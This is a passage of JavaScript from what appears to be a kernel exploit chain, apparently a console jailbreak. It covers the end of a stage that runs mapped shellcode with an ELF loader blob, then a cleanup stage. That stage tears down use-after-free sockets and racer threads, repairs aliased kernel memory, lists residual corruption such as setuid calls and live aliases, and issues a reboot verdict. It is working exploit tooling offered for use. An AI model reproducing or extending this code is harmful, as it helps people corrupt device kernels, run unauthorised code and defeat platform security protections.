      for (const st of r.steps) note(st);
      if (!r.ok) return FAIL("stage 5: " + r.why);
      if (!r.ran) return PASS("dry run: blobs staged, allproc found, shellcode " +
        "mapped RWX, pthread entries located, argument block " + "built",);
      return PASS("payload ran, shellcode returned " + r.shellRet +
        ". args: pipe fds, allproc, elfldr blob",);
    },
  });
  L.push({
    key: "ps7_report",
    label: "state report, cleanup, and the reboot verdict",
    cls: "cleanup",
    async run() {
      if (E.kernelWrites !== 0 && !E.S.aliasesRepaired)
        return FAIL(
          "kernelWrites is " +
            E.kernelWrites +
            " but stage 3 did not certify the repair " +
            "(aliasesRepaired=false)",
        );
      if (E.kernelWrites !== 0) note("kernel writes " + E.kernelWrites);

      const rep = await E.cleanup({
        teardown: {
          skipIndices:
            TW.tripletsValid() && !E.S.aliasesRepaired
              ? TW.S.triplets.slice()
              : [],
        },
      });
      for (const g of rep.groups) note("racers: " + g);
      if (rep.socketpairs) note("socketpairs: " + rep.socketpairs);
      if (rep.teardown) {
        if (rep.teardown.refused)
          note(
            "bank teardown refused: " +
              rep.teardown.reason +
              " -- " +
              rep.teardown.leftOpen +
              " sockets left open " +
              "on purpose",
          );
        else
          note(
            "bank: freed " +
              rep.teardown.freed +
              "/" +
              rep.teardown.total +
              ", closed " +
              rep.teardown.closed +
              "/" +
              rep.teardown.total +
              (rep.teardown.skipped && rep.teardown.skipped.length
                ? ", exempt " + rep.teardown.skipped.join(",")
                : ""),
          );
      }
      if (rep.kqClosed) note("kqueues closed at cleanup: " + rep.kqClosed);
      if (rep.pipesClosed) note("pipes closed: " + rep.pipesClosed);
      if (rep.poolClosed) note("free-fd pool tail closed: " + rep.poolClosed);
      for (const nn of rep.notes) note(nn);
      if (rep.uafLeft) note("uaf_socket: " + rep.uafLeft);
      if (rep.restore)
        note(
          "scheduler restored: affinity " +
            (rep.restore.affOk
              ? "OK"
              : "FAILED (saw " + rep.restore.affSeen + ")") +
            ", priority " +
            (rep.restore.prioOk
              ? "OK"
              : "FAILED (saw " + rep.restore.prioSeen + ")"),
        );

      const v = E.verdict({
        teardownRan: !!(rep.teardown && !rep.teardown.refused),
        teardownRefused: !!(rep.teardown && rep.teardown.refused),
        teardownIncomplete: !!(
          rep.teardown &&
          !rep.teardown.refused &&
          (rep.teardown.freeFailed || []).length +
            (rep.teardown.closeFailed || []).length >
            0
        ),
        chainDead: X.chainDeadNow ? X.chainDeadNow() : false,
        restoreMissing: !!rep.restoreNeeded && !rep.restore,
        affRestoreFailed: !!(
          rep.restoreNeeded &&
          rep.restore &&
          !rep.restore.affOk
        ),
        prioRestoreFailed: !!(
          rep.restoreNeeded &&
          rep.restore &&
          !rep.restore.prioOk
        ),
        affRestored: rep.restore ? !!rep.restore.affOk : !rep.restoreNeeded,
        prioRestored: rep.restore ? !!rep.restore.prioOk : !rep.restoreNeeded,
        cleanupFailed: state.cleanupFailed || "",
        strandedCount: (rep.doNotClose || []).length,
        repairExhausted:
          !TW.tripletsValid() && TW.S.triplets.some((t) => t >= 0),
      });
      X.measured.verdict = v;

      const residue = [];
      if (E.S.setuidCalls)
        residue.push(
          "R6 setuid(1) x" +
            E.S.setuidCalls +
            " -- irreversible for the rest of the boot",
        );
      if (E.S.rlimitRaised)
        residue.push(
          "R18 RLIMIT_NOFILE raised and never lowered " + "(harmless)",
        );
      if (E.triggered) residue.push("R9 line A: the trigger fired");
      if (TW.corrupt) residue.push("R10/R11 LINE B: " + TW.corrupt);
      if (TW.tripletsValid() && !E.S.aliasesRepaired)
        residue.push(
          "R12 three aliases live on one chunk -- stable and " + "intended",
        );
      else if (E.S.aliasesRepaired)
        residue.push("R12 cleared: rthdr pointers zeroed, read back zero");
      if (E.S.freeFdIdx)
        residue.push(
          "R7 " + E.S.freeFdIdx + " pool fds already spent " + "(closed once)",
        );
      if (E.S.uafSock >= 0 && !E.S.uafClosed)
        residue.push("R8 uaf_socket " + E.S.uafSock + " left open");
      if (rep.leftOpen.length)
        residue.push("left open deliberately: " + rep.leftOpen.join(", "));
      if (E.S.kqOpen.length)
        residue.push("R14 " + E.S.kqOpen.length + " kqueue fds still open");
      for (const rr of residue) note("RESIDUE " + rr);

      flushMark(
        "POOPS-VERDICT",
        (v.reboot ? "REBOOT" : "FINE") +
          "-triggered=" +
          (E.triggered ? 1 : 0) +
          "-alias=" +
          (TW.corrupt ? 1 : 0) +
          "-triplet=" +
          (TW.tripletsValid() ? 1 : 0) +
          "-repaired=" +
          (E.S.aliasesRepaired ? 1 : 0) +
          "-jailbroken=" +
          (E.S.jailbroken ? 1 : 0) +
          "-kernelWrites=" +
          E.kernelWrites +
          "-reasons=" +
          v.all.length,
      );

      for (let ri = 0; ri < v.all.length; ++ri)
        note(
          "reboot reason " + (ri + 1) + "/" + v.all.length + ": " + v.all[ri],
        );
      if (v.all.length)
        flushMark(
          "POOPS-VERDICT-WHY",
          v.all
            .map((x) => String(x).slice(0, 60))
            .join(" || ")
            .slice(0, 400),
        );

      if (v.reboot)
        return FAIL(
          v.text +
            "\nall reasons: " +
            v.all.join(" | ") +
            "\nreboot now, from this page.",
        );

      const ver = v.verified || {};
      return PASS(
        v.text +
          " verified: bank " +
          (ver.teardown
            ? "freed and closed socket by socket"
            : "teardown did not run (nothing was open)") +
          "; racers " +
          (ver.racers
            ? "terminated, status = ST_EXITED for " + "every spawned racer"
            : "not all confirmed") +
          "; scheduler affinity " +
          (ver.schedAff ? "restored and read back" : "not read back") +
          ", priority " +
          (ver.schedPrio ? "restored and read back" : "not read back") +
          "; descriptors stranded on purpose: " +
          (rep.doNotClose || []).length +
          "; kernel writes: " +
          ver.kernelWrites +
          ".",
      );
    },
  });

  return L;
}
